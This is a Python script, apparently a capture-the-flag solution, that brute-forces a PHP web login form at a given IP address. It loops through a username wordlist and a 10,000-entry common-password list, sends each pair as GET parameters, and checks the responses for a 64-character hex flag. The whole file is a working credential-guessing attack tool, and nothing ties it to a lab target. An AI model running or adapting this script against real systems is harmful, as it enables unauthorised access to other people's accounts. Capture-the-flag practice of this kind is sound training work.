#!/usr/bin/env python3
# -*- coding: utf-8 -*-

import requests
import re
import argparse
import os
import sys

# Wordlist file paths
username_list = "top-usernames-shortlist.txt"
password_list = "10k-most-common.txt"

def find_flag(response_text):
    match = re.search(r"The flag is\s*:\s*([a-fA-F0-9]{64})", response_text)
    return match.group(1) if match else None

def main():
    parser = argparse.ArgumentParser(
        description="Brute-force login form with usernames and passwords to find a flag.",
        usage="python3 %(prog)s --ip <target_ip>"
    )
    parser.add_argument("--ip", help="Target IP address (e.g., 192.168.56.102)")

    args = parser.parse_args()

    # Show usage if no IP is given
    if not args.ip:
        parser.print_help()
        sys.exit(1)

    base_url = f"http://{args.ip}/index.php?page=signin"

    # Validate wordlist files exist
    if not os.path.exists(username_list):
        print(f"[!] Username list not found: {username_list}")
        sys.exit(1)
    if not os.path.exists(password_list):
        print(f"[!] Password list not found: {password_list}")
        sys.exit(1)

    # Load usernames
    with open(username_list, "r", encoding='utf-8', errors='ignore') as f_user:
        usernames = [line.strip() for line in f_user if line.strip()]

    # Load passwords
    with open(password_list, "r", encoding='utf-8', errors='ignore') as f_pass:
        passwords = [line.strip() for line in f_pass if line.strip()]

    print(f"[i] Starting brute-force on {base_url}")
    print(f"[i] Total usernames: {len(usernames)} | Total passwords: {len(passwords)}\n")

    # Brute-force loop
    for username in usernames:
        for password in passwords:
            params = {
                "username": username,
                "password": password,
                "Login": "Login"
            }

            try:
                response = requests.get(base_url, params=params, timeout=5)
                if response.status_code == 200:
                    flag = find_flag(response.text)
                    if flag:
                        print(f"[+] SUCCESS! Username: {username} | Password: {password}")
                        print(f"[+] FLAG: {flag}")
                        return
                    else:
                        print(f"[-] Tried: {username}:{password}")
                else:
                    print(f"[!] HTTP {response.status_code} for {username}:{password}")
            except requests.RequestException as e:
                print(f"[!] Error for {username}:{password} - {e}")

    print("\n[X] No valid credentials found.")

if __name__ == "__main__":
    main()
